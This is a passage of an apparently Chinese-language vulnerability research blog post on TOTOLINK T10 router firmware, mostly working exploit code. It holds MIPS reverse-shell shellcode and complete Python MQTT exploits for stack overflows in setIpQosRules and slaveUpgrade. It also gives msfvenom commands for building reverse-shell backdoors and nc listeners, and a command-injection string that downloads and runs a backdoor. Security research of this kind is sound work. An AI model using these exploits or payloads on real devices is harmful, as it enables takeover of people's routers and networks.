class="string">&quot;\xff\xe5\x21\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x01&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x01\x01\xff\xff\xa2\xaf\xff\xff\xa4\x8f\xfd\xff\x0f&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x34\x27\x78\xe0\x01\xe2\xff\xaf\xaf\x0d\x05\x0e\x3c&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x0d\x05\xce\x35\xe4\xff\xae\xaf\x37\x05\x0e\x3c\xc0&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xa8\xce\x35\xe6\xff\xae\xaf\xe2\xff\xa5\x27\xef\xff&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24\x0c\x01\x01&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x01\xfd\xff\x11\x24\x27\x88\x20\x02\xff\xff\xa4\x8f&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x21\x28\x20\x02\xdf\x0f\x02\x24\x0c\x01\x01\x01\xff&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xff\x10\x24\xff\xff\x31\x22\xfa\xff\x30\x16\xff\xff&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x06\x28\x62\x69\x0f\x3c\x2f\x2f\xef\x35\xec\xff\xaf&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xaf\x73\x68\x0e\x3c\x6e\x2f\xce\x35\xf0\xff\xae\xaf&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xf4\xff\xa0\xaf\xec\xff\xa4\x27\xf8\xff\xa4\xaf\xfc&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xff\xa0\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24\x0c\x01&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x01\x01&quot;</span></span><br><span class="line"></span><br><span class="line">test = <span class="string">&quot;a&quot;</span>*<span class="number">218</span></span><br><span class="line"></span><br><span class="line">client = mqtt.Client()</span><br><span class="line">client.connect(<span class="string">&quot;192.168.55.1&quot;</span>,<span class="number">1883</span>,<span class="number">60</span>)</span><br><span class="line">client.publish(<span class="string">&#x27;totolink/router/setting/setIpQosRules&#x27;</span>,payload=<span class="string">&#x27;&#123;&quot;topicurl&quot;:&quot;setting/setIpQosRules&quot;,&quot;comment&quot;:&quot;xx&#x27;</span>+test+<span class="string">&#x27;\xb4\x43\x41&quot;&#125;&#x27;</span>+<span class="string">&#x27;bling&#x27;</span>+buf)</span><br></pre></td></tr></table></div></figure>
+<p>ps. 使用kali生成shellcode的方法如下，需要指定攻击机的 ip和port：</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/mipsle/shell_reverse_tcp LHOST=192.168.55.5 LPORT=2333 -f py -o mipsel919.txt</span><br></pre></td></tr></table></div></figure>
+<p>ps. 执行攻击脚本前，需要在攻击机上监听一个端口，用来接收反弹的shell：</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 2333</span><br></pre></td></tr></table></div></figure>
+
+        <h3 id="upgrade-so库中slaveUpgrade函数"   >
+          <a href="#upgrade-so库中slaveUpgrade函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#upgrade-so库中slaveUpgrade函数" class="headerlink" title="upgrade.so库中slaveUpgrade函数"></a>upgrade.so库中slaveUpgrade函数</h3>
+      <p>漏洞代码片段如下：</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">slaveUpgrade</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	......</span><br><span class="line">  <span class="keyword">char</span> v13[<span class="number">128</span>]; <span class="comment">// [sp+18h] [-C0h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v14[<span class="number">64</span>]; <span class="comment">// [sp+98h] [-40h] BYREF</span></span><br><span class="line">  ......</span><br><span class="line">  <span class="keyword">if</span> ( getValFromTmp(<span class="string">&quot;slaveUpgradeflag&quot;</span>) != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = (<span class="keyword">const</span> <span class="keyword">char</span> *)websGetVar(a2, <span class="string">&quot;url&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="built_in">strcat</span>(v14, v7);</span><br><span class="line">    ......</span><br><span class="line">  &#125;</span><br><span class="line">  ......</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+<p><code>strcat(v14, v7)</code>将v7的内容跟v14连接后，会导致v14溢出。根据前文“filewall.so库中setIpQosRules函数”小节中的利用方法，这个洞的调试和利用跟它很相似。</p>
+<p>这次，我们尝试用一个脚本做两件事（不需要额外开个窗口执行<code>nc -l 2333</code>），完整exp如下：</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> paho.mqtt.client <span class="keyword">as</span> mqtt</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">buf = <span class="string">&quot;\xfa\xff\x0f\x24\x27\x78\xe0\x01\xfd\xff\xe4\x21\xfd&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xff\xe5\x21\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x01&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x01\x01\xff\xff\xa2\xaf\xff\xff\xa4\x8f\xfd\xff\x0f&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x34\x27\x78\xe0\x01\xe2\xff\xaf\xaf\x09\x1d\x0e\x3c&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x09\x1d\xce\x35\xe4\xff\xae\xaf\x37\x03\x0e\x3c\xc0&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xa8\xce\x35\xe6\xff\xae\xaf\xe2\xff\xa5\x27\xef\xff&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24\x0c\x01\x01&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x01\xfd\xff\x11\x24\x27\x88\x20\x02\xff\xff\xa4\x8f&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x21\x28\x20\x02\xdf\x0f\x02\x24\x0c\x01\x01\x01\xff&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xff\x10\x24\xff\xff\x31\x22\xfa\xff\x30\x16\xff\xff&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x06\x28\x62\x69\x0f\x3c\x2f\x2f\xef\x35\xec\xff\xaf&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xaf\x73\x68\x0e\x3c\x6e\x2f\xce\x35\xf0\xff\xae\xaf&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xf4\xff\xa0\xaf\xec\xff\xa4\x27\xf8\xff\xa4\xaf\xfc&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xff\xa0\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24\x0c\x01&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x01\x01&quot;</span></span><br><span class="line">payload1 = <span class="string">&quot;a&quot;</span>*<span class="number">84</span></span><br><span class="line">payload1 += <span class="string">&quot;\x28\x43\x41&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">local_listen</span>():</span></span><br><span class="line">    l = listen(<span class="number">2333</span>)</span><br><span class="line">    l.wait_for_connection()</span><br><span class="line">    l.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_payload</span>():</span></span><br><span class="line">    client = mqtt.Client()</span><br><span class="line">    client.connect(<span class="string">&quot;192.168.55.1&quot;</span>,<span class="number">1883</span>,<span class="number">60</span>)</span><br><span class="line">    client.publish(<span class="string">&#x27;totolink/router/setting/slaveUpgrade&#x27;</span>,payload=<span class="string">&#x27;&#123;&quot;topicurl&quot;:&quot;setting/slaveUpgrade&quot;,&quot;url&quot;:&quot;&#x27;</span>+payload1+<span class="string">&#x27;&quot;&#125;&#x27;</span>+<span class="string">&#x27;blingha&#x27;</span>+buf)</span><br><span class="line"></span><br><span class="line">t1 = threading.Thread(target=local_listen)</span><br><span class="line">t2 = threading.Thread(target=send_payload)</span><br><span class="line"></span><br><span class="line">t1.start()</span><br><span class="line">t2.start()</span><br></pre></td></tr></table></div></figure>
+
+
+
+        <h1 id="其他"   >
+          <a href="#其他" class="heading-link"><i class="fas fa-link"></i></a><a href="#其他" class="headerlink" title="其他"></a>其他</h1>
+      
+        <h2 id="反连shell"   >
+          <a href="#反连shell" class="heading-link"><i class="fas fa-link"></i></a><a href="#反连shell" class="headerlink" title="反连shell"></a>反连shell</h2>
+      <p>为了拿到目标系统的shell，有时候需要往目标系统中植入后门，让其将shell返回到我们本地系统中。</p>
+<p>有两种情况，一种是利用命令注入漏洞，另一种是通过内存漏洞控制执行流。</p>
+
+        <h3 id="命令注入"   >
+          <a href="#命令注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3>
+      <p>分四步：</p>
+<ul>
+<li><p>生成backdoor</p>
+<p>使用metasploit中的msfvenom生成一个目标系统架构的backdoor文件，功能是反连shell</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(bling㉿kali)-[~]</span><br><span class="line">└─$ msfvenom --list payloads | grep mipsle</span><br><span class="line">    linux/mipsle/<span class="built_in">exec</span>                                   A very small shellcode <span class="keyword">for</span> executing commands. This module is sometimes helpful <span class="keyword">for</span> testing purposes as well as on targets with extremely limited buffer space.</span><br><span class="line">    linux/mipsle/meterpreter/reverse_tcp                Inject the mettle server payload (staged). Connect back to the attacker</span><br><span class="line">    linux/mipsle/meterpreter_reverse_http               Run the Meterpreter / Mettle server payload (stageless)</span><br><span class="line">    linux/mipsle/meterpreter_reverse_https              Run the Meterpreter / Mettle server payload (stageless)</span><br><span class="line">    linux/mipsle/meterpreter_reverse_tcp                Run the Meterpreter / Mettle server payload (stageless)</span><br><span class="line">    linux/mipsle/reboot                                 A very small shellcode <span class="keyword">for</span> rebooting the system. This payload is sometimes helpful <span class="keyword">for</span> testing purposes.</span><br><span class="line">    linux/mipsle/shell/reverse_tcp                      Spawn a <span class="built_in">command</span> shell (staged). Connect back to the attacker</span><br><span class="line">    linux/mipsle/shell_bind_tcp                         Listen <span class="keyword">for</span> a connection and spawn a <span class="built_in">command</span> shell</span><br><span class="line">    linux/mipsle/shell_reverse_tcp                      Connect back to attacker and spawn a <span class="built_in">command</span> shell</span><br><span class="line"></span><br><span class="line">┌──(bling㉿kali)-[~]</span><br><span class="line">└─$ msfvenom -p linux/mipsle/shell_reverse_tcp LHOST=127.0.0.1 LPORT=2333 -f elf -o test-mipsel</span><br></pre></td></tr></table></div></figure></li>
+<li><p>本地起http服务</p>
+<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/nopnog/p/8116848.html" >Python SimpleHTTPServer</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>服务端执行：<code>python -m SimpleHTTPServer</code>，默认监听本地8000端口</p>
+<p>客户端：<code>wget http://ip:8000/xxx</code>或直接访问<code>http://ip:8000/</code></p>
+</li>
+<li><p>本地监听</p>
+<p>使用 <code>nc -l [port]</code> 在本地监听一个端口，用于给backdoor连接</p>
+</li>
+<li><p>命令注入</p>
+<p>往目标系统注入如下命令：<code>;wget backdoor;chmod +x backdoor;./backdoor;</code></p>
+</li>
+</ul>
+
+        <h3 id="内存漏洞"   >
+          <a href="#内存漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#内存漏洞" class="headerlink" title="内存漏洞"></a>内存漏洞</h3>
+      <p>分三步：</p>
+<ul>
+<li><p>生成shellcode</p>
+<p>使用metasploit中的msfvenom生成一个shellcode，功能是反连shell</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(bling㉿kali)-[~]</span><br><span class="line">└─$ msfvenom -p linux/mipsle/shell_reverse_tcp LHOST=127.0.0.1 LPORT=2333 -f py -o test-mipsel.txt</span><br><span class="line"><span class="comment"># 不指定-f参数的话，生成了一个shellcode二进制文件。指定-f py生成的文件，方便写脚本使用。</span></span><br></pre></td></tr></table></div></figure></li>
+<li><p>本地监听</p>
+<p>使用 <code>nc -l [port]</code> 在本地监听一个端口，用于shellcode连接</p>
+</li>
+<li><p>ret2shellcode</p>
+<p>构造利用脚本，触发内存漏洞，控制劫持流执行shellcode</p>
+</li>
+</ul>
+
+        <h2 id="gdbserver的使用"   >
+          <a href="#gdbserver的使用" class="heading-link"><i class="fas fa-link"></i></a><a href="#gdbserver的使用" class="headerlink" title="gdbserver的使用"></a>gdbserver的使用</h2>
+      <p>gdbserver需要搭配gdb一起使用，gdbserver运行在待测系统内部，gdb运行在我们本地。</p>
+<p>首先，我们需要让gdbserver跟待测进程建立联系，有两种方式：</p>
+<ul>
+<li><p>第一种方法，使用gdbserver启动程序，并设置一个端口用于跟gdb建立连接</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./gdbserver :1234 /target/<span class="built_in">exec</span>/</span><br></pre></td></tr></table></div></figure></li>
+<li><p>第二种方法，使用 <code>—attach</code> 选项附加到某个已启动进程，附加上去后程序会断在当前运行指令处</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./gdbserver :1234 --attach [pid]</span><br></pre></td></tr></table></div></figure>
+<p>然后，让gdb跟gdbserver建立连接，这里需要根据待测进程的架构选择gdb或gdb-multiarch，有两种情况：</p>
+</li>
+<li><p>第一种情况，x86或x86_64架构使用gdb</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ gdb  </span><br><span class="line">......</span><br><span class="line">gef &gt; target remote [ip]:[port]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line">$ gdb -q /target/<span class="built_in">exec</span></span><br><span class="line">......</span><br><span class="line">gef &gt; target remote [ip]:[port]</span><br></pre></td></tr></table></div></figure></li>
+<li><p>第二种情况，arm/mips等其他架构使用gdb-multiarch</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ gdb-multiarch</span><br><span class="line">......</span><br><span class="line">gef &gt; <span class="built_in">set</span> architecture [arm/mips/...]</span><br><span class="line">gef &gt; <span class="built_in">set</span> endian little </span><br><span class="line">gef &gt; target remote [ip]:[port]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者，将以上三条命令写到文件中，然后直接使用gdb的&quot;-x&quot;参数指定配置文件</span></span><br><span class="line"></span><br><span class="line">$ gdb-multiarch -q /target/<span class="built_in">exec</span> -x xxx.cfg</span><br><span class="line">......</span><br><span class="line">gef &gt; </span><br></pre></td></tr></table></div></figure>
+
+        <h2 id="mount命令"   >
+          <a href="#mount命令" class="heading-link"><i class="fas fa-link"></i></a><a href="#mount命令" class="headerlink" title="mount命令"></a>mount命令</h2>
+      </li>
+</ul>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mount -o loop /fakefolder /realfoler</span><br><span class="line">umount /realfolder</span><br><span class="line"></span><br><span class="line">mount -o bind /fakefile /realfile</span><br><span class="line">umount /realfile</span><br></pre></td></tr></table></div></figure>
+
+        <h2 id="make-elf"   >
+          <a href="#make-elf" class="heading-link"><i class="fas fa-link"></i></a><a href="#make-elf" class="headerlink" title="make_elf"></a>make_elf</h2>
+      <p>shellcode变成elf的二种方式：</p>
+<ol>
+<li>用pwntools中make_elf（较简单）</li>
+<li>写一个main函数，用交叉编译编成不同平台的二进制（较麻烦）</li>
+</ol>
+
+        <h2 id="定位漏洞函数所在的进程"   >
+          <a href="#定位漏洞函数所在的进程" class="heading-link"><i class="fas fa-link"></i></a><a href="#定位漏洞函数所在的进程" class="headerlink" title="定位漏洞函数所在的进程"></a>定位漏洞函数所在的进程</h2>
+      <p>调试cstecgi.cgi时可能会面临这个问题</p>
+
+        <h2 id="lighttpd"   >
+          <a href="#lighttpd" class="heading-link"><i class="fas fa-link"></i></a><a href="#lighttpd" class="headerlink" title="lighttpd"></a>lighttpd</h2>
+      <p>…</p>
+
+        <h2 id="串口拿shell"   >
+          <a href="#串口拿shell" class="heading-link"><i class="fas fa-link"></i></a><a href="#串口拿shell" class="headerlink" title="串口拿shell"></a>串口拿shell</h2>
+      <p>…</p>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="http://blingblingxuanxuan.github.io">blingbling</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="http://blingblingxuanxuan.github.io/2021/09/25/analysis-of-totolink-t10/">http://blingblingxuanxuan.github.io/2021/09/25/analysis-of-totolink-t10/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://blingblingxuanxuan.github.io/tags/totolink/">totolink</a></span><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://blingblingxuanxuan.github.io/tags/gdbserver/">gdbserver</a></span><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://blingblingxuanxuan.github.io/tags/mqtt/">mqtt</a></span><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://blingblingxuanxuan.github.io/tags/%E8%B7%AF%E7%94%B1%E5%99%A8/">路由器</a></span></div><nav class="post-paginator paginator"><div class="paginator-next"><a class="paginator-next__link" href="/2021/08/09/basic-skills-of-pen-test/"><span class="paginator-prev__text">网络渗透的基本技能</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%80%E5%A4%B4%E4%B8%89%E6%AD%A5%E6%9B%B2"><span class="toc-number">1.</span> <span class="toc-text">
+          开头三步曲</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E8%AF%95%E8%AF%95"><span class="toc-number">1.1.</span> <span class="toc-text">
+          运行试试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.2.</span> <span class="toc-text">
+          扫描端口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%9B%BA%E4%BB%B6"><span class="toc-number">1.3.</span> <span class="toc-text">
+          获取固件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%88%E6%8B%BFSHELL"><span class="toc-number">2.</span> <span class="toc-text">
+          先拿SHELL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E7%9A%84telnet%E5%8A%9F%E8%83%BD"><span class="toc-number">2.1.</span> <span class="toc-text">
+          隐藏的telnet功能</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#burpsuite%E6%8A%93%E5%8C%85"><span class="toc-number">2.1.1.</span> <span class="toc-text">
+          burpsuite抓包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#telnet-shell"><span class="toc-number">2.1.2.</span> <span class="toc-text">
+          telnet shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E9%94%AEget-shell"><span class="toc-number">2.1.3.</span> <span class="toc-text">
+          一键get shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.</span> <span class="toc-text">
+          前台命令注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8pwntools%E5%AE%8C%E6%88%90%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC"><span class="toc-number">2.2.1.</span> <span class="toc-text">
+          使用pwntools完成利用脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8requests%E5%AE%8C%E6%88%90%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC"><span class="toc-number">2.2.2.</span> <span class="toc-text">
+          使用requests完成利用脚本</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%9A%E5%8A%A1%E5%88%86%E6%9E%90-where-is-telnet"><span class="toc-number">3.</span> <span class="toc-text">
+          业务分析 - where is telnet ?</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MQTT%E6%9C%8D%E5%8A%A1"><span class="toc-number">4.</span> <span class="toc-text">
+          MQTT服务</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mqtt%E6%8A%A5%E6%96%87%E5%88%86%E6%9E%90"><span class="toc-number">4.1.</span> <span class="toc-text">
+          mqtt报文分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E7%BC%96%E8%AF%91tcpdump"><span class="toc-number">4.1.1.</span> <span class="toc-text">
+          本地编译tcpdump</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91mipsel%E7%89%88tcpdump"><span class="toc-number">4.1.2.</span> <span class="toc-text">
+          交叉编译mipsel版tcpdump</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8tcpdump%E6%8A%93%E6%8A%A5%E6%96%87"><span class="toc-number">4.1.3.</span> <span class="toc-text">
+          使用tcpdump抓报文</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%81%E9%97%AD%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%95%B0%E6%8D%AE%E5%9B%9E%E4%BC%A0"><span class="toc-number">4.1.4.</span> <span class="toc-text">
+          封闭服务器数据回传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pcap%E6%8A%A5%E6%96%87%E5%88%86%E6%9E%90"><span class="toc-number">4.1.5.</span> <span class="toc-text">
+          pcap报文分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0mqtt%E6%8A%A5%E6%96%87"><span class="toc-number">4.2.</span> <span class="toc-text">
+          构造mqtt报文</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mqtt-fx%E7%9A%84subscribe%E4%B8%8Epublish"><span class="toc-number">4.2.1.</span> <span class="toc-text">
+          mqtt.fx的subscribe与publish</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8pwntools%E6%9E%84%E9%80%A0"><span class="toc-number">4.2.2.</span> <span class="toc-text">
+          利用pwntools构造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#python-MQTT%E5%BA%93%E6%9E%84%E9%80%A0"><span class="toc-number">4.2.3.</span> <span class="toc-text">
+          python MQTT库构造</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%8D%E6%8C%96%E6%8C%96%E5%90%A7"><span class="toc-number">5.</span> <span class="toc-text">
+          再挖挖吧</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%96%E4%B8%80%E4%B8%AAcs-sub%E4%B8%ADso%E5%BA%93%E7%9A%84%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">5.1.</span> <span class="toc-text">
+          挖一个cs_sub中so库的命令注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%96%E4%B8%80%E4%B8%AAcs-sub%E4%B8%ADso%E5%BA%93%E7%9A%84%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="toc-number">5.2.</span> <span class="toc-text">
+          挖一个cs_sub中so库的栈溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#filewall-so%E5%BA%93%E4%B8%ADsetIpQosRules%E5%87%BD%E6%95%B0"><span class="toc-number">5.2.1.</span> <span class="toc-text">
+          filewall.so库中setIpQosRules函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#upgrade-so%E5%BA%93%E4%B8%ADslaveUpgrade%E5%87%BD%E6%95%B0"><span class="toc-number">5.2.2.</span> <span class="toc-text">
+          upgrade.so库中slaveUpgrade函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">6.</span> <span class="toc-text">
+          其他</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E8%BF%9Eshell"><span class="toc-number">6.1.</span> <span class="toc-text">
+          反连shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">6.1.1.</span> <span class="toc-text">
+          命令注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E6%BC%8F%E6%B4%9E"><span class="toc-number">6.1.2.</span> <span class="toc-text">
+          内存漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gdbserver%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-number">6.2.</span> <span class="toc-text">
+          gdbserver的使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mount%E5%91%BD%E4%BB%A4"><span class="toc-number">6.3.</span> <span class="toc-text">
+          mount命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#make-elf"><span class="toc-number">6.4.</span> <span class="toc-text">
